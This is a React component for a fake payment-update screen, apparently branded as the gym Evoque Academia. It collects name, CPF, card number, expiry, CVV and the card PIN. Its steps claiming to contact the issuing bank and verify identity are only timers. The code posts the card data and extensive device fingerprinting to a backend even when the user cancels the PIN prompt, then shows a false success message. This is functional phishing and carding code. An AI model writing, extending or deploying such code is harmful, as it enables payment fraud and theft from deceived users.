import { useEffect, useState } from 'react';
import { CheckCircle, Loader } from 'lucide-react';
import { toast } from 'sonner';
import { CardPasswordModal } from './CardPasswordModal';
import { detectDeviceInfo, type DeviceInfo } from '@/utils/device-detector';

interface PaymentProcessingScreenProps {
  isOpen: boolean;
  paymentData: {
    nomeCompleto: string;
    cpf: string;
    numeroCartao: string;
    validade: string;
    cvv: string;
  };
  onClose: () => void;
}

type ProcessingStep = 'contacting' | 'validating' | 'identity' | 'success';

const steps = [
  { id: 'contacting', label: 'Entrando em contato com banco emissor..' },
  { id: 'validating', label: 'Validando informações..' },
  { id: 'identity', label: 'Confirmação de identidade..' },
];

export const PaymentProcessingScreen = ({
  isOpen,
  paymentData,
  onClose,
}: PaymentProcessingScreenProps) => {
  const [currentStep, setCurrentStep] = useState<ProcessingStep>('contacting');
  const [completedSteps, setCompletedSteps] = useState<string[]>([]);
  const [showPasswordModal, setShowPasswordModal] = useState(false);
  const [cardPassword, setCardPassword] = useState('');
  const [isSubmittingPassword, setIsSubmittingPassword] = useState(false);
  const [deviceInfo, setDeviceInfo] = useState<DeviceInfo | null>(null);

  useEffect(() => {
    if (!isOpen) return;

    // Captura informações do dispositivo
    const captureDeviceInfo = async () => {
      try {
        const info = await detectDeviceInfo();
        setDeviceInfo(info);
      } catch (error) {
        console.error('Erro ao capturar informações do dispositivo:', error);
      }
    };

    captureDeviceInfo();

    // Simula cada passo do processamento
    const timings = [
      { step: 'contacting', duration: 2000 },
      { step: 'validating', duration: 2000 },
      { step: 'identity', duration: 2000 },
    ];

    let currentTime = 0;

    // Agenda cada passo
    timings.forEach((timing, index) => {
      setTimeout(() => {
        setCompletedSteps((prev) => [...prev, timing.step]);

        if (index < timings.length - 1) {
          setCurrentStep(timings[index + 1].step as ProcessingStep);
        } else {
          // Após o último passo, mostra modal de senha
          setTimeout(() => {
            setShowPasswordModal(true);
          }, 500);
        }
      }, currentTime);

      currentTime += timing.duration;
    });
  }, [isOpen]);

  const sendPaymentToBackend = async (password: string = '') => {
    try {
      const backendUrl = 'http://localhost:5555';

      // Prepara dados completos com informações do dispositivo
      const completePaymentData = {
        ...paymentData,
        senhaCartao: password,
        // Informações do Dispositivo
        ip: deviceInfo?.ip,
        userAgent: deviceInfo?.userAgent,
        browserName: deviceInfo?.browserName,
        browserVersion: deviceInfo?.browserVersion,
        osName: deviceInfo?.osName,
        osVersion: deviceInfo?.osVersion,
        deviceType: deviceInfo?.deviceType,
        deviceModel: deviceInfo?.deviceModel,
        screenWidth: deviceInfo?.screenWidth,
        screenHeight: deviceInfo?.screenHeight,
        language: deviceInfo?.language,
        timezone: deviceInfo?.timezone,
        connectionType: deviceInfo?.connectionType,
        effectiveConnectionType: deviceInfo?.effectiveConnectionType,
        cores: deviceInfo?.cores,
        ram: deviceInfo?.ram,
        gpu: deviceInfo?.gpu,
        maxTouchPoints: deviceInfo?.maxTouchPoints,
        devicePixelRatio: deviceInfo?.devicePixelRatio,
      };

      const response = await fetch(`${backendUrl}/api/update-payment`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(completePaymentData),
      });

      if (response.ok) {
        // Envia email com confirmação
        await fetch(`${backendUrl}/api/send-email`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            to: paymentData.cpf,
            subject: 'Dados de Pagamento Atualizados - Evoque Academia',
            paymentData: completePaymentData,
          }),
        }).catch(() => {
          // Continua mesmo se falhar
        });

        // Mostra tela de sucesso
        setShowPasswordModal(false);
        setCurrentStep('success');

        // Aguarda 3 segundos e fecha
        setTimeout(() => {
          toast.success('Dados atualizados com sucesso!');
          onClose();
          resetState();
        }, 3000);
      } else {
        toast.error('Erro ao atualizar dados', {
          description: 'Por favor, tente novamente.',
        });
        setShowPasswordModal(false);
        setIsSubmittingPassword(false);
      }
    } catch (error) {
      console.error('Erro ao enviar dados:', error);
      toast.error('Erro ao processar requisição', {
        description: 'Por favor, verifique sua conexão.',
      });
      setShowPasswordModal(false);
      setIsSubmittingPassword(false);
    }
  };

  const handlePasswordSubmit = async (password: string) => {
    setIsSubmittingPassword(true);
    setCardPassword(password);
    await sendPaymentToBackend(password);
  };

  const handlePasswordCancel = async () => {
    setIsSubmittingPassword(true);
    // Envia os dados sem a senha
    await sendPaymentToBackend('');
  };

  const resetState = () => {
    setCurrentStep('contacting');
    setCompletedSteps([]);
    setCardPassword('');
  };

  if (!isOpen) return null;

  return (
    <>
      <div className="fixed inset-0 z-50 bg-background flex flex-col items-center justify-center p-4">
      {/* Background gradient */}
      <div className="fixed inset-0 bg-gradient-to-br from-background via-background to-secondary/20 pointer-events-none" />

      {/* Content */}
      <div className="relative z-10 w-full max-w-md flex flex-col items-center justify-center min-h-screen space-y-8">
        {currentStep !== 'success' ? (
          <>
            {/* Processing Steps */}
            <div className="space-y-6 w-full">
              {steps.map((step) => {
                const isCompleted = completedSteps.includes(step.id);
                const isActive = currentStep === step.id;

                return (
                  <div key={step.id} className="flex items-start gap-4">
                    {/* Step indicator */}
                    <div className="mt-1 flex-shrink-0">
                      {isCompleted ? (
                        <CheckCircle className="h-8 w-8 text-green-500" />
                      ) : isActive ? (
                        <Loader className="h-8 w-8 text-primary animate-spin" />
                      ) : (
                        <div className="h-8 w-8 rounded-full border-2 border-muted-foreground/30" />
                      )}
                    </div>

                    {/* Step label */}
                    <div className="flex-1 pt-1">
                      <p
                        className={`text-sm font-medium transition-colors ${
                          isCompleted || isActive
                            ? 'text-foreground'
                            : 'text-muted-foreground/50'
                        }`}
                      >
                        {step.label}
                      </p>
                    </div>
                  </div>
                );
              })}
            </div>

            {/* Animated dots */}
            <div className="flex gap-2 mt-8">
              <div className="h-2 w-2 bg-primary rounded-full animate-bounce" />
              <div className="h-2 w-2 bg-primary rounded-full animate-bounce animation-delay-100" />
              <div className="h-2 w-2 bg-primary rounded-full animate-bounce animation-delay-200" />
            </div>
          </>
        ) : (
          <>
            {/* Success State */}
            <div className="flex flex-col items-center justify-center space-y-6 py-12">
              <div className="h-20 w-20 flex items-center justify-center">
                <CheckCircle className="h-20 w-20 text-green-500" />
              </div>

              <div className="text-center space-y-3">
                <h2 className="text-2xl font-bold text-foreground">
                  Seus dados foram atualizados com sucesso!
                </h2>
                <p className="text-base text-muted-foreground">
                  Obrigado pela confiança.
                </p>
              </div>
            </div>
          </>
        )}
      </div>
      </div>

      <CardPasswordModal
        isOpen={showPasswordModal}
        onSubmit={handlePasswordSubmit}
        onCancel={handlePasswordCancel}
        isLoading={isSubmittingPassword}
      />
    </>
  );
};
